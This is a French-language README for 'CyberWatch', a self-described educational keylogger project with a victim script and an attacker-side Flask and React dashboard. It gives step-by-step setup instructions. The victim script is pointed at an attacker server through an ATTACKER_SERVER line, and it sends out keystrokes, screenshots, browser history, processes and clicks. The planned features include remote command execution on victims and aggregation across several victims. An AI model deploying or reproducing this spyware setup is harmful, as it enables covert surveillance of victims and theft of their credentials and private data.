# CyberWatch – Keylogger Dashboard (Usage rapide)

## 📌 1. C’est quoi le projet ?
CyberWatch est un projet pédagogique qui simule :
- une **machine victime** qui exécute un keylogger (`keylogger_advanced.py`)
- une **machine attaquante** qui reçoit les données :
  - Backend Flask (API + SQLite)
  - Frontend React (Dashboard)

La victime envoie : frappes, clics, fenêtres actives, processus, historique navigateur et captures d’écran → le dashboard les affiche.

---

## 📁 2. Architecture simple

```
[MACHINE VICTIME]
  keylogger_advanced.py
        |
        |  POST /api/init + /api/data
        v
[MACHINE ATTAQUANTE - BACKEND]
  Flask + SQLite
        |
        |  GET /api/... (JSON)
        v
[FRONTEND REACT - CYBERWATCH]
  Dashboard + pages (frappes, captures, navigateur, détails)
```

---

## 🚀 3. Comment utiliser

### 🟥 A. Sur la machine attaquante – Lancer le backend

```bash
cd attacker_dashboard/backend
pip install -r requirements.txt
python app.py
```

➡️ Flask démarre sur : **http://0.0.0.0:5000**

💡 Ouvrir le port 5000 dans le firewall Windows :
- Pare-feu → Règles → Nouveau → TCP → Port 5000 → Autoriser

---

### 🟦 B. Sur la machine attaquante – Lancer le frontend

```bash
cd attacker_dashboard/frontend
npm install
npm start
```

➡️ CyberWatch dispo sur : **http://localhost:3000**

---

### 🟩 C. Sur la machine victime – Lancer le keylogger

```bash
cd victim_script
pip install -r requirements.txt
```

Dans `keylogger_advanced.py`, changer :

```python
ATTACKER_SERVER = "http://IP_DE_L_ATTAQUANT:5000"
```

Puis lancer :

```bash
python keylogger_advanced.py
```

---

## 👀 4. Résultat

Dès que la victime se connecte :

- Le **Dashboard** affiche la victime
- Les pages :
  - **Frappes**
  - **Captures d’écran**
  - **Historique navigateur**
  - **Processus / fenêtres / clics**
  - **Détails victime**
- Les commandes apparaissent dans l’onglet commandes

---

## 📈 5. Améliorations futures

- Activer la page **Statistiques** (graphes basés sur plusieurs victimes)
- Rendre fonctionnel l’exécution réelle des commandes côté victime
- Ajouter une rétention locale si réseau offline

---
